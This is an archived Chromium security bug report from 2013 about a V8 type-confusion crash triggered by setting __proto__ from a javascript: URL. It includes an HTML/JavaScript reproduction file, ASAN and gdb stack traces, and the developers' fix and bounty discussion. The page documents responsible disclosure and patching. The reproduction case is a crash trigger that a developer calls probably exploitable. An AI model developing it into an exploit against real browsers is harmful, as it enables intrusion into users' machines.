# Security: SEGV on unknown address with javascript url and __proto__

| Field | Value |
|-------|-------|
| **Issue ID** | [40077781](https://issues.chromium.org/issues/40077781) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Reporter** | cl...@gmail.com |
| **Assignee** | ms...@chromium.org |
| **Created** | 2013-07-13 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

The testcase below crashes the chrome ASAN build. The asan output is unfortunately not very helpful:

# ASAN:SIGSEGV

==7899==ERROR: AddressSanitizer: SEGV on unknown address 0x00004cec603d (pc 0x220320f181a8 sp 0x7fff4e1bfed8 bp 0x7fff4e1bff08 T0)  

AddressSanitizer can not provide additional info.  

#0 0x220320f181a7 (+0x121a7)  

==7899==ABORTING

Could be an issue with the JIT compiler (just a guess).

**VERSION**  

Chrome Version: asan-symbolized-linux-release-211418  

Operating System: Linux 64-bit

**REPRODUCTION CASE**  

Very simple single HTML file (attached as well):

<html>
<script>
function start() {
o0=document.createElement('iframe');;
document.getElementById('store\_div').appendChild(o0);
o247=document.documentElement;
o250=o0.contentWindow.document;
o250.location.href='javascript:window.top.cb\_scripturl\_100\_1();undefined;';
}
function cb\_scripturl\_100\_1() {
o447=o250.createElement('style');;
o506=o247.firstChild.parentElement.firstChild.childNodes.\_\_proto\_\_.\_\_proto\_\_;
o506.\_\_proto\_\_=o447.style;
o514=document.createElement('blockquote');
}
</script>
<body onload="start()"><div id="store\_div"></div></body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: See ASAN output above

## Attachments

- [crash.html](attachments/crash.html) (text/html; charset=us-ascii, 560 B)

## Timeline

### in...@chromium.org (2013-07-14)

Kostya, Alex - is this a bug in ASAN where we are not getting any crash frames [frames with function names]. This kind of report will be ignored by ClusterFuzz which is sad :(

### in...@chromium.org (2013-07-15)

[Empty comment from Monorail migration]

### gl...@chromium.org (2013-07-15)

Here's the crash stack from crash/632de32c13e455e0, which I've got from google-chrome-asan with the above repro:

0x2828fa412488			
0x7fab37375b39	 [chrome]	 - execution.cc:119]	v8::internal::Invoke
0x7fab37375ea4	 [chrome]	 - execution.cc:191]	v8::internal::Execution::New(v8::internal::Handle<v8::internal::JSFunction>, int, v8::internal::Handle<v8::internal::Object>*, bool*)
0x7fab37329856	 [chrome]	 - api.cc:3985]	v8::Function::NewInstance() const
0x7fab380fc5f4	 [chrome]	 - V8ObjectConstructor.cpp:42]	WebCore::V8ObjectConstructor::newInstance(v8::Handle<v8::Function>)
0x7fab380fdb92	 [chrome]	 - V8PerContextData.cpp:105]	WebCore::V8PerContextData::createWrapperFromCacheSlowCase(WebCore::WrapperTypeInfo*)
0x7fab380f4a24	 [chrome]	 - V8PerContextData.h:81]	WebCore::V8DOMWrapper::createWrapper(v8::Handle<v8::Object>, WebCore::WrapperTypeInfo*, void*, v8::Isolate*)
0x7fab37f17044	 [chrome]	 - V8HTMLQuoteElement.cpp:179]	WebCore::V8HTMLQuoteElement::createWrapper(WTF::PassRefPtr<WebCore::HTMLQuoteElement>, v8::Handle<v8::Object>, v8::Isolate*)
0x7fab3814389f	 [chrome]	 - V8HTMLQuoteElement.h:73]	WebCore::createHTMLQuoteElementWrapper
0x7fab38148003	 [chrome]	 - V8HTMLElementWrapperFactory.cpp:785]	WebCore::createV8HTMLWrapper(WebCore::HTMLElement*, v8::Handle<v8::Object>, v8::Isolate*)
0x7fab3811dfd8	 [chrome]	 - V8HTMLElementCustom.cpp:41]	WebCore::wrap(WebCore::HTMLElement*, v8::Handle<v8::Object>, v8::Isolate*)
0x7fab38115644	 [chrome]	 - V8ElementCustom.cpp:48]	WebCore::wrap(WebCore::Element*, v8::Handle<v8::Object>, v8::Isolate*)
0x7fab3804dc49	 [chrome]	 - V8Element.h:108]	WebCore::DocumentV8Internal::createElementMethodCallbackForMainWorld
0x7fab373442b4	 [chrome]	 - builtins.cc:1333]	v8::internal::Builtin_HandleApiCall

### in...@chromium.org (2013-07-15)

[Empty comment from Monorail migration]

### gl...@chromium.org (2013-07-15)

I've also tried a clean Chromium build with debug info:

$ ASAN_OPTIONS=sleep_before_dying=100 out/Release/chrome 1.html --no-sandboxASAN:SIGSEGV
=================================================================
==27079==ERROR: AddressSanitizer: SEGV on unknown address 0x00007853f039 (pc 0x7fe8d70181a8 sp 0x7fffde5e27d8 bp 0x7fffde5e2808 T0)
AddressSanitizer can not provide additional info.
    #0 0x7fe8d70181a7 (+0x121a7)
==27079==ABORTING
==27079==Sleeping for 100 second(s)

(gdb) i r
rax            0x0	0
rbx            0x186dc0304121	26859654889761
rcx            0x33ebe2e041d9	57088216678873
rdx            0x186dc035f249	26859655262793
rsi            0x7853f012	2018766866
rdi            0x7fe8d6c060e1	140638012072161
rbp            0x7fffde5e2808	0x7fffde5e2808
rsp            0x7fffde5e27d8	0x7fffde5e27d8
r8             0x0	0
r9             0x7fffde5e2b20	140736924101408
r10            0x7fe8d702b641	140638016419393
r11            0x7fe919c68a80	140639136549504
r12            0x100000000	4294967296
r13            0x62c000000298	108576773243544
r14            0x7fffde5e2960	140736924100960
r15            0x62c0000032d8	108576773255896
rip            0x7fe8d70181a8	0x7fe8d70181a8
eflags         0x293	[ CF AF SF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) bt
#0  0x00007fe9027fc84d in nanosleep () at ../sysdeps/unix/syscall-template.S:82
#1  0x00007fe9027fc6ec in __sleep (seconds=0) at ../sysdeps/unix/sysv/linux/sleep.c:138
#2  0x00007fe90be0a63d in AsanDie () at /usr/local/google/home/thakis/src/chrome/src/third_party/llvm/projects/compiler-rt/lib/asan/asan_rtl.cc:41
#3  0x00007fe90be0f21f in Die () at /usr/local/google/home/thakis/src/chrome/src/third_party/llvm/projects/compiler-rt/lib/sanitizer_common/sanitizer_common.cc:47
#4  0x00007fe90be093dd in ~ScopedInErrorReport () at /usr/local/google/home/thakis/src/chrome/src/third_party/llvm/projects/compiler-rt/lib/asan/asan_report.cc:501
#5  0x00007fe90be09386 in ~ScopedInErrorReport () at /usr/local/google/home/thakis/src/chrome/src/third_party/llvm/projects/compiler-rt/lib/asan/asan_report.cc:488
#6  0x00007fe90be07c79 in ReportSIGSEGV () at /usr/local/google/home/thakis/src/chrome/src/third_party/llvm/projects/compiler-rt/lib/asan/asan_report.cc:534
#7  0x00007fe90be06ab6 in ASAN_OnSIGSEGV () at /usr/local/google/home/thakis/src/chrome/src/third_party/llvm/projects/compiler-rt/lib/asan/asan_posix.cc:58
#8  <signal handler called>
#9  0x00007fe8d70181a8 in ?? ()
#10 0x00007fe8d702b6f1 in ?? ()
#11 0x0000186dc035f249 in ?? ()
#12 0x00007fe8d6c060e1 in ?? ()
#13 0x00007fe8d702b641 in ?? ()
#14 0x0000000800000000 in ?? ()
#15 0x0000000000000000 in ?? ()


For some reason ASan is unable to unwind the stack here, while gdb is.

### gl...@chromium.org (2013-07-15)

Here's the report with ASAN_OPTIONS=fast_unwind_on_fatal=1, so the problem is with the slow unwinder:

=================================================================
==22052==ERROR: AddressSanitizer: SEGV on unknown address 0x00007853f039 (pc 0x11ab10b181a8 sp 0x7fff99d80598 bp 0x7fff99d805c8 T0)
AddressSanitizer can not provide additional info.
    #0 0x11ab10b181a7 in
    #1 0x11ab10b0dd16 in
    #2 0x7f04dcd3d0d8 in Invoke v8/src/execution.cc:119
    #3 0x7f04dcc2e96e in NewInstance v8/src/api.cc:4304
    #4 0x7f04d9dc66f9 in instantiateObject third_party/WebKit/Source/bindings/v8/V8ScriptRunner.cpp:182
    #5 0x7f04d9dbcd58 in newInstance third_party/WebKit/Source/bindings/v8/V8ObjectConstructor.cpp:42
    #6 0x7f04d9dbdb2d in createWrapperFromCacheSlowCase third_party/WebKit/Source/bindings/v8/V8PerContextData.cpp:98
    #7 0x7f04d9da5d11 in createWrapperFromCache third_party/WebKit/Source/bindings/v8/V8PerContextData.h:85
    #8 0x7f04d9da59c5 in createWrapper third_party/WebKit/Source/bindings/v8/V8DOMWrapper.cpp:114
    #9 0x7f04d94fc2b5 in createWrapper /usr/local/google/chrome-asan/src/out/Release/gen/webkit/bindings/V8HTMLQuoteElement.cpp:155
    #10 0x7f04d9ea6492 in wrap /usr/local/google/chrome-asan/src/out/Release/gen/webkit/bindings/V8HTMLQuoteElement.h:78
    #11 0x7f04d9e8cf18 in createV8HTMLWrapper /usr/local/google/chrome-asan/src/out/Release/gen/webkit/V8HTMLElementWrapperFactory.cpp:776
    #12 0x7f04d9df237c in wrap third_party/WebKit/Source/bindings/v8/custom/V8ElementCustom.cpp:45
    #13 0x7f04d9b586c7 in toV8FastForMainWorld<v8::FunctionCallbackInfo<v8::Value>, WebCore::Document> /usr/local/google/chrome-asan/src/out/Release/gen/webkit/bindings/V8Element.h:113
    #14 0x7f04dcc50c70 in Call v8/src/arguments.cc:103
    #15 0x7f04dcc90faf in HandleApiCallHelper<false> v8/src/builtins.cc:1272
    #16 0x11ab10b06aed in
    #17 0x11ab10b6166b in
    #18 0x11ab10b61446 in
    #19 0x11ab10b2b623 in
    #20 0x11ab10b185b6 in
    #21 0x7f04dcd3d0d8 in Invoke v8/src/execution.cc:119
    #22 0x7f04dcc13614 in Run v8/src/api.cc:2022
    #23 0x7f04d9dc569f in runCompiledScript third_party/WebKit/Source/bindings/v8/V8ScriptRunner.cpp:95
    #24 0x7f04d9d61974 in compileAndRunScript third_party/WebKit/Source/bindings/v8/ScriptController.cpp:241
    #25 0x7f04d9d65eaf in executeScriptInMainWorld third_party/WebKit/Source/bindings/v8/ScriptController.cpp:683
    #26 0x7f04d9d65b8a in executeScript third_party/WebKit/Source/bindings/v8/ScriptController.cpp:624
    #27 0x7f04d9d659e3 in executeScript third_party/WebKit/Source/bindings/v8/ScriptSourceCode.h:47
    #28 0x7f04d9d664f2 in executeScriptIfJavaScriptURL third_party/WebKit/Source/bindings/v8/ScriptController.cpp:646
    #29 0x7f04dad5822d in load third_party/WebKit/Source/core/loader/FrameLoader.cpp:942
    #30 0x7f04dad8bca1 in fire third_party/WebKit/Source/core/loader/NavigationScheduler.cpp:116
    #31 0x7f04dad8677b in timerFired third_party/WebKit/Source/core/loader/NavigationScheduler.cpp:424
    #32 0x7f04d890269d in sharedTimerFiredInternal third_party/WebKit/Source/core/platform/ThreadTimers.cpp:134
    #33 0x7f04d890217b in sharedTimerFired third_party/WebKit/Source/core/platform/ThreadTimers.cpp:108
    #34 0x7f04dd985ca7 in Run base/callback.h:396
    #35 0x7f04dd8dffdc in Run base/callback.h:396
    #36 0x7f04dd8e0864 in DeferOrRunPendingTask base/message_loop/message_loop.cc:509
    #37 0x7f04dd8e18fb in DoWork base/message_loop/message_loop.cc:703
    #38 0x7f04dd8e8ede in Run base/message_loop/message_pump_default.cc:29
    #39 0x7f04dd8deb99 in RunInternal base/message_loop/message_loop.cc:451
    #40 0x7f04dd930323 in Run base/run_loop.cc:45
    #41 0x7f04dd8dd51d in Run base/message_loop/message_loop.cc:331
    #42 0x7f04de692d6f in RendererMain content/renderer/renderer_main.cc:247
    #43 0x7f04ddf58af9 in RunZygote content/app/content_main_runner.cc:389
    #44 0x7f04ddf5a028 in RunNamedProcessTypeMain content/app/content_main_runner.cc:445
    #45 0x7f04ddf5b87d in Run content/app/content_main_runner.cc:757
    #46 0x7f04ddf58251 in ContentMain content/app/content_main.cc:35
    #47 0x7f04d6bc0116 in ChromeMain chrome/app/chrome_main.cc:32
    #48 0x7f04d6bc005a in main chrome/app/chrome_exe_main_gtk.cc:43
    #49 0x7f04cd50f76c in __libc_start_main /build/buildd/eglibc-2.15/csu/libc-start.c:226
==22052==ABORTING


### ms...@chromium.org (2013-07-15)

I am looking into this.

### gl...@chromium.org (2013-07-15)

For the record, when using _Unwind_Backtrace ASan gets the _URC_END_OF_STACK reason code. I wonder if v8 provides enough info for _Unwind_Backtrace to proceed.

### ms...@chromium.org (2013-07-15)

[Empty comment from Monorail migration]

### ms...@chromium.org (2013-07-15)

This is fixed on V8 bleeding edge. The issue is that one of V8's internal caches is susceptible to monkey-patching of the Object.prototype object. This essentially means that an arbitrary JavaScript value (including strings) can be cast to a JSFunction. I suspect this is exploitable since a JSFunction contains among other things the code entry point.

https://code.google.com/p/v8/source/detail?r=15665

### in...@chromium.org (2013-07-15)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-07-18)

[Comment Deleted]

### in...@chromium.org (2013-07-18)

removed the wrong comment in this bug. 

Michael, can you please merge the fix to m28 and m29 branches. m28 patch 1 is going out next week, so that merge is important :)

### in...@chromium.org (2013-07-18)

[Empty comment from Monorail migration]

### ms...@chromium.org (2013-07-19)

The fix has been merged back to V8 version 3.18 and 3.19 respectively.

https://code.google.com/p/v8/source/detail?r=15767
https://code.google.com/p/v8/source/detail?r=15765

### in...@chromium.org (2013-07-19)

Thanks Michael, you are awesome :)!

### gl...@chromium.org (2013-07-22)

Yang, Michael, can you please comment on https://code.google.com/p/chromium/issues/detail?id=260106#c8? Does v8 always generate the appropriate unwind info for _Unwind_Backtrace?

### in...@chromium.org (2013-07-22)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-07-23)

@cloudfuzzer: awesome! $1000

### pa...@chromium.org (2013-08-19)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### ya...@chromium.org (2014-10-13)

@17: Not sure what unwind info need to be generated. V8 probably does not do that.

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/260106?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40077781)*
